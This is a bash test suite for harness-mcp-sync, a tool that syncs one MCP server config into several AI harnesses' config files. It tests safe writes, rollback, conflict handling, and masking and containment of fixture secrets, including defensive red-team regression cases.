#!/usr/bin/env bash
# Tests for bin/harness-mcp-sync — SSOT -> per-harness MCP config sync.
# Self-contained: temp HOME + temp state dir + a FIXTURE registry (never the real
# harnesses/ configs, never the real HOME). Asserts every safety rule of the tool,
# and that the fixture secret never appears in ANY captured stdout/stderr.
# Run: bash bin/tests/harness-mcp-sync.test.sh
set -uo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
BIN="$DIR/../harness-mcp-sync"

pass=0 ; fail=0
ok() { pass=$((pass + 1)); printf '  \xe2\x9c\x93 %s\n' "$1"; }
no() { fail=$((fail + 1)); printf '  \xe2\x9c\x97 %s\n      got: [%s]\n' "$1" "$2"; }
has()  { case "$2" in *"$1"*) ok "$3" ;; *) no "$3" "$2" ;; esac; }
hasnt(){ case "$2" in *"$1"*) no "$3" "$2" ;; *) ok "$3" ;; esac; }
eq()   { [ "$1" = "$2" ] && ok "$3" || no "$3" "got=[$2] want=[$1]"; }
sum()  { if [ -e "$1" ]; then shasum -a 256 "$1" | cut -d' ' -f1; else echo ABSENT; fi; }
# GNU stat's -f means --file-system (it succeeds with a multi-line report), so pick the flavour
# explicitly instead of relying on the BSD form failing.
if stat --version 2>/dev/null | grep -q GNU; then mode() { stat -c '%a' "$1"; }
else mode() { stat -f '%Lp' "$1"; }; fi

printf 'harness-mcp-sync.test.sh\n'

REAL_HOME="$HOME"
T="$(mktemp -d 2>/dev/null || mktemp -d -t hms)"
trap 'rm -rf "$T"' EXIT
export HOME="$T/home"; mkdir -p "$HOME"
export TMPDIR="$T/tmp"; mkdir -p "$TMPDIR"   # self-heal run logs land inside the temp root
unset XDG_STATE_HOME
# Safe-by-construction against ANY binary (incl. pre-never-dispatch revisions that
# auto-dispatched a self-heal agent on a fault): every AI harness name resolves first
# to a failing stub that only records it was called, and the old opt-out is forced off.
STUBS="$T/stubs"; mkdir -p "$STUBS"; STUBLOG="$T/stub-calls.log"; : > "$STUBLOG"
HARNESS_STUB_NAMES="kiro-cli claude codex opencode gemini crush amp"
for n in $HARNESS_STUB_NAMES; do
  printf '#!/bin/sh\necho "%s $*" >> "%s"\nexit 1\n' "$n" "$STUBLOG" > "$STUBS/$n"
  chmod +x "$STUBS/$n"
done
export PATH="$STUBS:$PATH"
export MAOS_SELFHEAL=0
SD="$T/state"; REG="$T/reg"; mkdir -p "$REG"
ALLOUT="$T/all-output.log"; : > "$ALLOUT"
export FIXSECRET="sekret-VALUE-7f3a9c1e2d"   # fixture secret: must never be printed
export OTHERVAL="plain-env-value-42"

# Real config paths must not change (snapshot a few mtimes/checksums)
REAL_SNAP="$T/real.snap"
# (~/.claude.json is excluded: live Claude Code sessions rewrite it concurrently.)
for f in "$REAL_HOME/.codex/config.toml" "$REAL_HOME/.gemini/settings.json" \
         "$REAL_HOME/.cursor/mcp.json" "$REAL_HOME/.config/opencode/opencode.json"; do
  echo "$f $(sum "$f")" >> "$REAL_SNAP"
done

# ---------------------------------------------------------------- fixture registry
mk() { # id format key style path headers disable_field semantics confidence [extra-yaml]
  cat > "$REG/$1.yaml" <<EOF
schema: 1
id: $1
name: Fixture $1
kind: cli
detect: {commands: [], paths: ["~/.$1"]}
mcp:
  supported: true
  config_paths: [{path: "$5", scope: user}]
  format: $2
  key_path: [$3]
  entry_style: $4
  transports: [stdio, streamable-http, http, sse]
  supports: {headers: $6, env: true, disable: $( [ "$7" = null ] && echo false || echo true ), disable_field: $7, disable_semantics: $8}
  cli: null
update: {version_cmd: null, update_cmd: "true-but-never-run"}
last_verified: '2026-09-24'
confidence: $9
skip_reason: null
${10:-}
EOF
  mkdir -p "$HOME/.$1"
}
mk hjson   json  mcpServers      mcpservers-json     "~/.hjson/mcp.json"      true  disabled null  high
sed -i.bak 's/disable_semantics: null/disable_semantics: disabled-bool/' "$REG/hjson.yaml" && rm -f "$REG/hjson.yaml.bak"
# hjson gets a real, allow-listed version probe: a fixture binary on PATH (records whatever it reads on stdin)
FIXBIN="$T/fixbin"; mkdir -p "$FIXBIN"; export PATH="$FIXBIN:$PATH"
printf '#!/bin/sh
cat > "%s/fixh-stdin" 2>/dev/null
echo "fixture-hjson 1.0"
' "$T" > "$FIXBIN/fixh"; chmod +x "$FIXBIN/fixh"
sed -i.bak -e 's/detect: {commands: \[\]/detect: {commands: [fixh]/' -e 's/version_cmd: null/version_cmd: "fixh --version"/' "$REG/hjson.yaml" && rm -f "$REG/hjson.yaml.bak"
mk htoml   toml  mcp_servers     codex               "~/.htoml/config.toml"   true  enabled  enabled-bool high
mk hgrok   toml  mcp_servers     grok-toml           "~/.hgrok/config.toml"   true  enabled  enabled-bool high
mk hnohdr  json  mcpServers      mcpservers-json     "~/.hnohdr/mcp.json"     false null     null  high
mk hlow    json  mcpServers      mcpservers-json     "~/.hlow/mcp.json"       true  null     null  low
mk hjsonc  jsonc servers         vscode-servers      "~/.hjsonc/mcp.json"     true  null     null  high
mk hgit    json  mcpServers      mcpservers-json     "~/gitrepo/mcp.json"     true  null     null  high
mk hopen   json  mcp             opencode            "~/.hopen/opencode.json" true  enabled  enabled-bool high
mk hgoose  yaml  extensions      goose-extensions    "~/.hgoose/config.yaml"  true  enabled  enabled-bool high
mk hgem    json  mcpServers      mcpservers-json     "~/.hgem/settings.json"  true  null     null  high \
  ""
python3 - "$REG/hgem.yaml" <<'EOF'
import sys,re
p=sys.argv[1]; t=open(p).read()
t=t.replace("  entry_style: mcpservers-json\n","  entry_style: mcpservers-json\n  entry_overrides:\n    url_field: {streamable-http: httpUrl, sse: url}\n    type_values: {stdio: null, streamable-http: null, sse: null}\n")
open(p,"w").write(t)
EOF
mk hgtrk   json  mcpServers      mcpservers-json     "~/gitrepo/tracked.json" true  null     null  high
mk hgign   json  mcpServers      mcpservers-json     "~/gitrepo/ignored.json" true  null     null  high
mkdir -p "$HOME/gitrepo" && git -C "$HOME/gitrepo" init -q >/dev/null 2>&1
printf 'ignored.json\n' > "$HOME/gitrepo/.gitignore"
echo '{"mcpServers":{}}' > "$HOME/gitrepo/tracked.json"
git -C "$HOME/gitrepo" add tracked.json .gitignore >/dev/null 2>&1
git -C "$HOME/gitrepo" -c user.email=t@t -c user.name=t commit -qm init >/dev/null 2>&1

SSOT="$T/ssot.json"
cat > "$SSOT" <<'EOF'
{"schema":1,"servers":{
 "cf-remote":{"transport":"streamable-http","url":"https://mcp.example.test/mcp",
   "headers":{"Authorization":"Bearer ${FIXSECRET}"},"enabled":true,"replaces":["cf-legacy"]},
 "opt-remote":{"transport":"streamable-http","url":"https://opt.example.test/mcp","enabled":false},
 "local-tool":{"transport":"stdio","command":"npx","args":["-y","pkg"],"env":{"K":"${OTHERVAL}"}}}}
EOF

run() { # captures combined output into $o, exit into $rc, appends to ALLOUT
  o="$("$BIN" "$@" --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?
  printf '%s\n' "$o" >> "$ALLOUT"
}

# ---------------------------------------------------------------- pre-existing hand-written content
cat > "$HOME/.hjson/mcp.json" <<'EOF'
{
  "theme": "dark",
  "mcpServers": {
    "hand-written": {"command": "hand", "args": ["x"]},
    "cf-legacy": {"type": "http", "url": "https://old.example.test"}
  },
  "zzz": [1, 2, 3]
}
EOF
cat > "$HOME/.htoml/config.toml" <<'EOF'
# user comment at top
model = "gpt-x"

[mcp_servers.hand]
command = "hand"
args = ["a"]

[profiles.work]
model = "other"
EOF
TOML_PREFIX="$(sed -n '1,7p' "$HOME/.htoml/config.toml")"

# ---------------------------------------------------------------- usage
run bogus-mode; eq 2 "$rc" 'unknown mode exits 2'
run plan --harness hjson; eq 2 "$rc" 'plan without --ssot exits 2'
run plan --ssot "$SSOT" --harness nope; eq 2 "$rc" 'unknown harness id exits 2'
has 'research it, then add harnesses/<id>.yaml with confidence: low' "$o" 'unknown harness: error tells how to onboard it'

# ---------------------------------------------------------------- explain / inventory / doctor
run explain --json; has '"hjson"' "$o" 'explain lists fixture harnesses'
run inventory --harness hjson; has 'hand-written' "$o" 'inventory lists unmanaged names'
run doctor --harness hgit --json; has '"git": "untracked"' "$o" 'doctor: untracked-not-ignored config flagged'
has '"status": "warn"' "$o" 'doctor: untracked-not-ignored is warn'
run doctor --harness hgign; has 'in-git-repo(ignored)' "$o" 'doctor: ignored config is ok-with-note'
run doctor --harness hgtrk --json; has '"git": "tracked"' "$o" 'doctor: tracked config flagged'

# ---------------------------------------------------------------- plan never writes
B1="$(sum "$HOME/.hjson/mcp.json")"; B2="$(sum "$HOME/.htoml/config.toml")"
run plan --ssot "$SSOT" --json
eq "$B1" "$(sum "$HOME/.hjson/mcp.json")" 'plan leaves JSON untouched'
eq "$B2" "$(sum "$HOME/.htoml/config.toml")" 'plan leaves TOML untouched'
[ -e "$HOME/.hopen/opencode.json" ] && no 'plan creates no new files' exists || ok 'plan creates no new files'
has 'remove' "$o" 'plan proposes replaced legacy removal'
has 'replaced-by cf-remote' "$o" 'replaces reported as remove(replaced-by X)'
has 'lacks header support' "$o" 'no-header harness: remote server skipped + warned'
has 'confidence low' "$o" 'low-confidence harness is plan-only with reason'
has 'git work tree' "$o" 'in-git config: secret server skipped with reason'
has '«secret»' "$o" 'plan masks secret values'
hasnt 'sha256:' "$o" 'mask carries no hash (no brute-force oracle)'

# ---------------------------------------------------------------- apply
run apply --ssot "$SSOT" --json --adopt cf-legacy
TS="$(printf '%s' "$o" | python3 -c 'import sys,json; print(json.load(sys.stdin)["backup_ts"] or "")' 2>/dev/null)"
[ -n "$TS" ] && ok "apply reports a backup ts" || no 'apply reports a backup ts' "$o"
eq 600 "$(mode "$HOME/.hjson/mcp.json")" 'written file mode 600'
eq 700 "$(mode "$SD/backups")" 'backups dir mode 700'
BK="$(ls "$SD/backups/$TS/hjson/mcp.json" 2>/dev/null)"
[ -n "$BK" ] && eq 600 "$(mode "$BK")" 'backup file mode 600' || no 'backup exists' "$TS"

J="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); m=d["mcpServers"]; print(d["theme"], d["zzz"], sorted(m), m["hand-written"], m["cf-remote"]["type"], m["opt-remote"].get("disabled"))' "$HOME/.hjson/mcp.json")"
has "dark [1, 2, 3]" "$J" 'JSON: hand-written sibling keys preserved'
has "{'command': 'hand', 'args': ['x']}" "$J" 'JSON: unmanaged entry preserved'
hasnt "cf-legacy" "$J" 'JSON: replaced legacy entry removed'
has "http True" "$J" 'JSON: disabled server written with disabled=true where supported'

eq "$TOML_PREFIX" "$(sed -n '1,7p' "$HOME/.htoml/config.toml")" 'TOML: hand-written prefix byte-preserved'
T1="$(python3 -c 'import tomllib,sys; d=tomllib.load(open(sys.argv[1],"rb")); m=d["mcp_servers"]; print(sorted(m), m["opt-remote"]["enabled"], m["cf-remote"]["http_headers"]["Authorization"].startswith("Bearer "), d["profiles"]["work"]["model"])' "$HOME/.htoml/config.toml" 2>&1)"
has "['cf-remote', 'hand', 'local-tool', 'opt-remote'] False True other" "$T1" 'TOML: surgical — managed tables added, others intact, enabled=false'
python3 -c 'import tomllib,sys; d=tomllib.load(open(sys.argv[1],"rb")); assert d["mcp_servers"]["cf-remote"]["headers"]["Authorization"].startswith("Bearer ")' "$HOME/.hgrok/config.toml" 2>/dev/null \
  && ok 'grok-toml: inline headers table' || no 'grok-toml: inline headers table' "$(cat "$HOME/.hgrok/config.toml" | sed "s/$FIXSECRET/X/g")"

N="$(python3 -c 'import json,sys; m=json.load(open(sys.argv[1])).get("mcpServers",{}); print(sorted(m))' "$HOME/.hnohdr/mcp.json" 2>&1)"
eq "['local-tool']" "$N" 'no-disable harness: disabled server omitted; header-less harness skips remote'
[ -e "$HOME/.hlow/mcp.json" ] && no 'low-confidence never applied' exists || ok 'low-confidence never applied'
hasnt "cf-remote" "$(cat "$HOME/gitrepo/mcp.json" 2>/dev/null)" 'in-git untracked-not-ignored: secret server refused'
hasnt "cf-remote" "$(cat "$HOME/gitrepo/tracked.json" 2>/dev/null)" 'in-git tracked: secret server refused'
hasnt "local-tool" "$(cat "$HOME/gitrepo/tracked.json" 2>/dev/null)" 'in-git tracked: placeholder-bearing env server also refused'
has "cf-remote" "$(cat "$HOME/gitrepo/ignored.json" 2>/dev/null)" 'in-git ignored: secret server applied'
G="$(python3 -c 'import json,sys; m=json.load(open(sys.argv[1]))["mcpServers"]["cf-remote"]; print(sorted(m))' "$HOME/.hgem/settings.json" 2>&1)"
eq "['headers', 'httpUrl']" "$G" 'entry_overrides: url_field httpUrl + type omitted'
O="$(python3 -c 'import json,sys; m=json.load(open(sys.argv[1]))["mcp"]; print(m["local-tool"]["command"], m["local-tool"]["type"], m["opt-remote"]["enabled"])' "$HOME/.hopen/opencode.json" 2>&1)"
eq "['npx', '-y', 'pkg'] local False" "$O" 'opencode: local command array + enabled=false'
Y="$(python3 -c 'import yaml,sys; m=yaml.safe_load(open(sys.argv[1]))["extensions"]; print(m["local-tool"]["cmd"], m["cf-remote"]["type"], m["opt-remote"]["enabled"])' "$HOME/.hgoose/config.yaml" 2>&1)"
eq "npx streamable_http False" "$Y" 'goose: yaml extensions rendered'

# ---------------------------------------------------------------- idempotency
run plan --ssot "$SSOT" --json
N2="$(printf '%s' "$o" | python3 -c 'import sys,json; r=json.load(sys.stdin); print(sum(1 for h in r if h["applicable"] for a in h["actions"] if a["action"] in ("add","update","remove")))' 2>&1)"
eq 0 "$N2" 'second plan is empty (idempotent)'
S1="$(sum "$HOME/.hjson/mcp.json")"; run apply --ssot "$SSOT"; eq "$S1" "$(sum "$HOME/.hjson/mcp.json")" 'second apply writes nothing'
run verify --ssot "$SSOT"; eq 0 "$rc" 'verify clean after apply'

# ---------------------------------------------------------------- conflict / adopt
python3 - "$HOME/.hjson/mcp.json" <<'EOF'
import json,sys; p=sys.argv[1]; d=json.load(open(p)); d["mcpServers"]["new-srv"]={"command":"mine"}; json.dump(d,open(p,"w"),indent=2)
EOF
chmod 600 "$HOME/.hjson/mcp.json"
SSOT2="$T/ssot2.json"
python3 - "$SSOT" "$SSOT2" <<'EOF'
import json,sys; d=json.load(open(sys.argv[1])); d["servers"]["new-srv"]={"transport":"stdio","command":"theirs"}; json.dump(d,open(sys.argv[2],"w"))
EOF
C0="$(sum "$HOME/.hjson/mcp.json")"
run apply --ssot "$SSOT2" --harness hjson
eq 1 "$rc" 'apply with unmanaged same-name entry exits 1'
has 'conflict:unmanaged' "$o" 'unmanaged same-name entry reported as conflict'
eq mine "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["mcpServers"]["new-srv"]["command"])' "$HOME/.hjson/mcp.json")" 'conflicting entry not overwritten'
run apply --ssot "$SSOT2" --harness hjson --adopt new-srv
eq 0 "$rc" '--adopt resolves the conflict'
eq theirs "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["mcpServers"]["new-srv"]["command"])' "$HOME/.hjson/mcp.json")" 'adopted entry now owned + updated'

# ---------------------------------------------------------------- rollback after failed parse-back
mk hrb json mcpServers mcpservers-json "~/.hrb/mcp.json" true null null high
echo '{"keep": true, "mcpServers": {}}' > "$HOME/.hrb/mcp.json"; chmod 600 "$HOME/.hrb/mcp.json"
R0="$(sum "$HOME/.hrb/mcp.json")"
# Fault injected from the TEST side: import the script as a module and wrap its
# atomic_write so the target config gets corrupted bytes (the binary has no hook).
o="$(python3 - "$BIN" "$HOME/.hrb/mcp.json" apply --ssot "$SSOT" --harness hrb --registry "$REG" --state-dir "$SD" 2>&1 <<'PY'
import importlib.machinery, importlib.util, os, sys
path, target, argv = sys.argv[1], os.path.realpath(sys.argv[2]), sys.argv[3:]
loader = importlib.machinery.SourceFileLoader("hms", path)
spec = importlib.util.spec_from_loader("hms", loader)
hms = importlib.util.module_from_spec(spec)
loader.exec_module(hms)
real = hms.atomic_write
hits = []
def corrupting(p, data, mode=0o600):
    if os.path.realpath(p) == target and not hits:   # corrupt ONLY the apply write, not the restore
        hits.append(1)
        data = data[: len(data) // 2] + b"\x00"
    return real(p, data, mode)
hms.atomic_write = corrupting
sys.stdout, sys.stderr = hms.Redactor(sys.stdout), hms.Redactor(sys.stderr)
code = hms.run(argv)
sys.stdout.flush()
sys.exit(code)
PY
)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" 'corrupted write: apply exits 1'
has 'rolled-back' "$o" 'corrupted write: reported rolled-back'
eq "$R0" "$(sum "$HOME/.hrb/mcp.json")" 'corrupted write: original bytes restored'
hasnt 'hrb' "$(python3 -c 'import json,sys; print(list(json.load(open(sys.argv[1]))["files"]))' "$SD/manifest.json")" 'corrupted write: manifest not updated'

# ---------------------------------------------------------------- malformed TOML aborts pre-write
cp "$HOME/.htoml/config.toml" "$T/good.toml"
printf 'broken = [\n' >> "$HOME/.htoml/config.toml"
M0="$(sum "$HOME/.htoml/config.toml")"
run apply --ssot "$SSOT2" --harness htoml
[ "$rc" -ne 0 ] && ok 'malformed TOML: apply exits non-zero' || no 'malformed TOML: apply exits non-zero' "$rc"
eq "$M0" "$(sum "$HOME/.htoml/config.toml")" 'malformed TOML: file unchanged'
cp "$T/good.toml" "$HOME/.htoml/config.toml"; chmod 600 "$HOME/.htoml/config.toml"

# ---------------------------------------------------------------- commented jsonc refused
cat > "$HOME/.hjsonc/mcp.json" <<'EOF'
{
  // user comment
  "servers": {},
  "inputs": [],
}
EOF
J0="$(sum "$HOME/.hjsonc/mcp.json")"
run apply --ssot "$SSOT" --harness hjsonc
eq 1 "$rc" 'commented jsonc: apply refused (exit 1)'
has 'allow-comment-loss' "$o" 'commented jsonc: reason names the flag'
eq "$J0" "$(sum "$HOME/.hjsonc/mcp.json")" 'commented jsonc: file unchanged'
run apply --ssot "$SSOT" --harness hjsonc --allow-comment-loss
eq 0 "$rc" 'commented jsonc: applied with --allow-comment-loss'
eq "stdio" "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["servers"]["local-tool"]["type"])' "$HOME/.hjsonc/mcp.json")" 'vscode-servers: stdio type emitted'
hasnt 'opt-remote' "$(cat "$HOME/.hjsonc/mcp.json")" 'vscode (no disable flag): disabled server omitted'

# ---------------------------------------------------------------- verify detects drift
chmod 644 "$HOME/.hjson/mcp.json"
run verify --ssot "$SSOT2" --harness hjson; eq 1 "$rc" 'verify: mode != 600 is drift'
has '0o644' "$o" 'verify names the bad mode'
chmod 600 "$HOME/.hjson/mcp.json"
python3 - "$HOME/.hjson/mcp.json" <<'EOF'
import json,sys; p=sys.argv[1]; d=json.load(open(p)); d["mcpServers"]["cf-remote"]["headers"]["Authorization"]="Bearer tampered-token-xyz"; json.dump(d,open(p,"w"),indent=2)
EOF
chmod 600 "$HOME/.hjson/mcp.json"
run verify --ssot "$SSOT2"; eq 1 "$rc" 'verify: value drift detected'
has 'drift vs SSOT' "$o" 'verify reports SSOT drift'
has 'differing secret hashes' "$o" 'verify: same-secret-same-hash across harnesses'
hasnt 'tampered-token-xyz' "$o" 'verify never prints config header values'

# ---------------------------------------------------------------- restore round-trip
RB="$(sum "$BK")"
run restore "$TS" --harness hjson
eq 0 "$rc" 'restore exits 0'
eq "$RB" "$(sum "$HOME/.hjson/mcp.json")" 'restore round-trips the pre-apply bytes'
has 'cf-legacy' "$(cat "$HOME/.hjson/mcp.json")" 'restored file has original legacy entry'
run restore 19990101T000000Z; eq 2 "$rc" 'restore of unknown ts exits 2'

# ---------------------------------------------------------------- resolver
SSOT3="$T/ssot3.json"
echo '{"schema":1,"servers":{"v":{"transport":"streamable-http","url":"https://v.test","headers":{"A":"op://vault/item/field"}}}}' > "$SSOT3"
run plan --ssot "$SSOT3" --harness hjson; eq 2 "$rc" 'op:// without --resolver is a hard error'
has 'needs --resolver' "$o" 'op:// error explains'
RES="$T/resolver.sh"; printf '#!/bin/sh\nprintf "%%s" "$FIXSECRET"\n' > "$RES"; chmod +x "$RES"
run plan --ssot "$SSOT3" --harness hjson --resolver "$RES"; eq 0 "$rc" 'resolver executable resolves op:// refs'
unset OTHERVAL; run plan --ssot "$SSOT" --harness hjson; eq 2 "$rc" 'missing env placeholder is a hard error'
export OTHERVAL="plain-env-value-42"

# ---------------------------------------------------------------- update (suggest only)
run update --harness hjson --json; has 'fixture-hjson 1.0' "$o" 'update prints version from version_cmd'
has 'true-but-never-run' "$o" 'update prints update_cmd as suggestion'

# ---------------------------------------------------------------- URL-embedded credentials masked in ALL modes
URLOUT="$T/url-output.log"; : > "$URLOUT"
C_USER="Pa55wordCRED9x"; C_QUERY="QueryTok3nCRED7y"; C_SEG="Zt9xQ2pLm8vK3rN7wB4yH6cD1fG5jA0e"; C_UNM="UnmanagedS3cretCRED"
mk hurl json mcpServers mcpservers-json "~/.hurl/mcp.json" true disabled disabled-bool high
printf '{"mcpServers": {"legacy-unmanaged": {"type": "http", "url": "https://bob:%s@legacy.cred.test/mcp?token=%s"}}}\n' "$C_UNM" "$C_UNM" > "$HOME/.hurl/mcp.json"
chmod 600 "$HOME/.hurl/mcp.json"
SSOTU="$T/ssot-url.json"
printf '{"schema":1,"servers":{"u-userinfo":{"transport":"streamable-http","url":"https://alice:%s@mcp.cred.test/mcp"},"u-query":{"transport":"streamable-http","url":"https://mcp.cred.test/mcp?api_key=%s&region=eu"},"u-path":{"transport":"streamable-http","url":"https://mcp.cred.test/s/%s/mcp"}}}\n' "$C_USER" "$C_QUERY" "$C_SEG" > "$SSOTU"
urun() { o="$("$BIN" "$@" --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$URLOUT"; printf '%s\n' "$o" >> "$ALLOUT"; }
urun plan --ssot "$SSOTU" --harness hurl --json;  has 'mcp.cred.test' "$o" 'url mask: host stays visible (plan)'
has '«masked»@mcp.cred.test' "$o" 'url mask: userinfo masked'
has 'api_key=«masked»&region=eu' "$o" 'url mask: secret query param masked, others kept'
has '/s/«masked»/mcp' "$o" 'url mask: high-entropy path segment masked'
urun plan --ssot "$SSOTU" --harness hurl
urun inventory --harness hurl --json
urun inventory --harness hurl
urun doctor --harness hurl --json
urun explain --harness hurl --json
urun apply --ssot "$SSOTU" --harness hurl --json
urun verify --ssot "$SSOTU" --harness hurl --json
urun verify --ssot "$SSOT" --harness hurl
urun plan --ssot "$SSOTU" --harness "https://eve:$C_USER@bad.cred.test/x"; eq 2 "$rc" 'forced error path (unknown harness = URL) exits 2'
has 'bad.cred.test' "$o" 'forced error path: host still visible'
printf '{"schema":1,"servers":{"https://x:%s@err.cred.test/?token=%s":{"transport":"stdio","command":"x"}}}\n' "$C_USER" "$C_QUERY" > "$T/ssot-bad.json"
urun plan --ssot "$T/ssot-bad.json" --harness hurl; eq 2 "$rc" 'forced error path (invalid server name = URL) exits 2'
LEAK=""
for c in "$C_USER" "$C_QUERY" "$C_SEG" "$C_UNM"; do grep -q "$c" "$URLOUT" && LEAK="$LEAK $c"; done
eq "" "$LEAK" 'url mask: no raw URL credential in any mode (plan/inventory/doctor/explain/apply/verify/errors)'
has "$C_USER" "$(cat "$HOME/.hurl/mcp.json")" 'url mask is output-only: config file holds the real URL'

# ---------------------------------------------------------------- red-team regressions F1-F7
# F1: secret with '"', '\' and TAB must not survive JSON serialization (header AND --key=${X} arg)
export QSECRET="$(printf 'q"uo\\\\te\tTAB-9f8e7d')"
mk hq json mcpServers mcpservers-json "~/.hq/mcp.json" true null null high
SSOTQ="$T/ssot-q.json"
cat > "$SSOTQ" <<'EOF'
{"schema":1,"servers":{
 "q-remote":{"transport":"streamable-http","url":"https://q.example.test/mcp","headers":{"X-Key":"${QSECRET}"}},
 "q-local":{"transport":"stdio","command":"tool","args":["--key=${QSECRET}","-v"]}}}
EOF
QOUT="$T/q-output.log"; : > "$QOUT"
qrun() { o="$("$BIN" "$@" --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$QOUT"; printf '%s\n' "$o" >> "$ALLOUT"; }
qrun plan --ssot "$SSOTQ" --harness hq --json
qrun apply --ssot "$SSOTQ" --harness hq --json
eq 0 "$rc" 'F1: apply with quote/backslash/tab secret succeeds'
qrun plan --ssot "$SSOTQ" --harness hq
qrun verify --ssot "$SSOTQ" --harness hq --json
Q="$(python3 - "$QOUT" <<'PY'
import json,os,sys
v=os.environ["QSECRET"]; txt=open(sys.argv[1],encoding="utf-8").read()
forms={v, json.dumps(v)[1:-1], json.dumps(v,ensure_ascii=False)[1:-1], "TAB-9f8e7d"}
print(" ".join(sorted(repr(f) for f in forms if f in txt)))
PY
)"
eq "" "$Q" 'F1: raw + JSON-escaped secret forms absent from plan/apply/verify output'
has '«secret»' "$(cat "$QOUT")" 'F1: --key=${X} arg value masked in preview'
eq "$QSECRET" "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["mcpServers"]["q-remote"]["headers"]["X-Key"], end="")' "$HOME/.hq/mcp.json")" 'F1: config file holds the exact secret'

# F2: literal secrets (no placeholder) refused for tracked / untracked-not-ignored targets
SSOTL="$T/ssot-lit.json"
cat > "$SSOTL" <<'EOF'
{"schema":1,"servers":{
 "lit-hdr":{"transport":"streamable-http","url":"https://l.example.test/mcp","headers":{"Authorization":"Bearer literal-abc123"}},
 "lit-arg":{"transport":"stdio","command":"tool","args":["--api-key","literalvalue99"]},
 "lit-argeq":{"transport":"stdio","command":"tool","args":["--token=literalvalue98"]},
 "lit-url":{"transport":"streamable-http","url":"https://u:pw9876543@l.example.test/mcp"},
 "clean":{"transport":"stdio","command":"tool","args":["-v"]}}}
EOF
run apply --ssot "$SSOTL" --harness hgtrk,hgit
L="$(python3 -c 'import json,sys; print(sorted(json.load(open(sys.argv[1]))["mcpServers"]), sorted(json.load(open(sys.argv[2]))["mcpServers"]))' "$HOME/gitrepo/tracked.json" "$HOME/gitrepo/mcp.json" 2>&1)"
eq "['clean'] ['clean']" "$L" 'F2: literal header/arg/url secrets refused in tracked + untracked git files; clean server written'
hasnt 'literal' "$(cat "$HOME/gitrepo/tracked.json" "$HOME/gitrepo/mcp.json")" 'F2: no literal secret reached a git-visible file'

# F3: symlinked config — inside HOME written THROUGH (link kept); outside HOME refused; into git repo judged by target
mk hsym json mcpServers mcpservers-json "~/.hsym/mcp.json" true null null high
mkdir -p "$HOME/realcfg"; echo '{"mcpServers":{}}' > "$HOME/realcfg/mcp.json"; chmod 600 "$HOME/realcfg/mcp.json"
ln -s "$HOME/realcfg/mcp.json" "$HOME/.hsym/mcp.json"
run apply --ssot "$SSOT" --harness hsym
eq 0 "$rc" 'F3: symlink inside HOME: apply ok'
[ -L "$HOME/.hsym/mcp.json" ] && ok 'F3: symlink preserved (not replaced by a regular file)' || no 'F3: symlink preserved' "$(ls -l "$HOME/.hsym/mcp.json")"
has 'cf-remote' "$(cat "$HOME/realcfg/mcp.json")" 'F3: link target received the write'
mk hout json mcpServers mcpservers-json "~/.hout/mcp.json" true null null high
mkdir -p "$T/outside"; echo '{"mcpServers":{}}' > "$T/outside/mcp.json"; OUT0="$(sum "$T/outside/mcp.json")"
ln -s "$T/outside/mcp.json" "$HOME/.hout/mcp.json"
run apply --ssot "$SSOT" --harness hout
eq 1 "$rc" 'F3: symlink target outside HOME: apply refused (exit 1)'
has 'outside HOME' "$o" 'F3: refusal names the reason'
eq "$OUT0" "$(sum "$T/outside/mcp.json")" 'F3: outside target untouched'
mk hsg json mcpServers mcpservers-json "~/.hsg/mcp.json" true null null high
echo '{"mcpServers":{}}' > "$HOME/gitrepo/tracked2.json"
git -C "$HOME/gitrepo" add tracked2.json >/dev/null 2>&1; git -C "$HOME/gitrepo" -c user.email=t@t -c user.name=t commit -qm t2 >/dev/null 2>&1
ln -s "$HOME/gitrepo/tracked2.json" "$HOME/.hsg/mcp.json"
run apply --ssot "$SSOT" --harness hsg
hasnt 'cf-remote' "$(cat "$HOME/gitrepo/tracked2.json")" 'F3: symlink into a git repo: tracked target -> secret server refused'
[ -L "$HOME/.hsg/mcp.json" ] && ok 'F3: git-target symlink preserved' || no 'F3: git-target symlink preserved' x

# F4: owned entry hand-edited since apply -> conflict:modified-since-apply unless --adopt
mk hmod json mcpServers mcpservers-json "~/.hmod/mcp.json" true disabled disabled-bool high
run apply --ssot "$SSOT" --harness hmod
python3 - "$HOME/.hmod/mcp.json" <<'EOF'
import json,sys; p=sys.argv[1]; d=json.load(open(p)); d["mcpServers"]["local-tool"]["args"]=["--hand-tuned"]; json.dump(d,open(p,"w"),indent=2)
EOF
chmod 600 "$HOME/.hmod/mcp.json"; M1="$(sum "$HOME/.hmod/mcp.json")"
run apply --ssot "$SSOT" --harness hmod
eq 1 "$rc" 'F4: hand-edited owned entry: apply exits 1'
has 'conflict:modified-since-apply' "$o" 'F4: reported as conflict:modified-since-apply'
eq "$M1" "$(sum "$HOME/.hmod/mcp.json")" 'F4: hand edit not overwritten'
run apply --ssot "$SSOT" --harness hmod --adopt local-tool
eq 0 "$rc" 'F4: --adopt overwrites the hand-edited entry'
hasnt 'hand-tuned' "$(cat "$HOME/.hmod/mcp.json")" 'F4: adopted entry back to SSOT'

# F5: unmanaged legacy under replaces needs --adopt
mk hrep json mcpServers mcpservers-json "~/.hrep/mcp.json" true null null high
echo '{"mcpServers":{"cf-legacy":{"type":"http","url":"https://old.example.test"}}}' > "$HOME/.hrep/mcp.json"; chmod 600 "$HOME/.hrep/mcp.json"
run plan --ssot "$SSOT" --harness hrep
has 'remove(replaced-by cf-remote, needs --adopt cf-legacy)' "$o" 'F5: plan shows remove(replaced-by X, needs --adopt)'
run apply --ssot "$SSOT" --harness hrep
eq 1 "$rc" 'F5: unowned legacy: apply exits 1'
has 'cf-legacy' "$(cat "$HOME/.hrep/mcp.json")" 'F5: unowned legacy NOT removed without --adopt'
run apply --ssot "$SSOT" --harness hrep --adopt cf-legacy
hasnt 'cf-legacy' "$(cat "$HOME/.hrep/mcp.json")" 'F5: --adopt removes it'

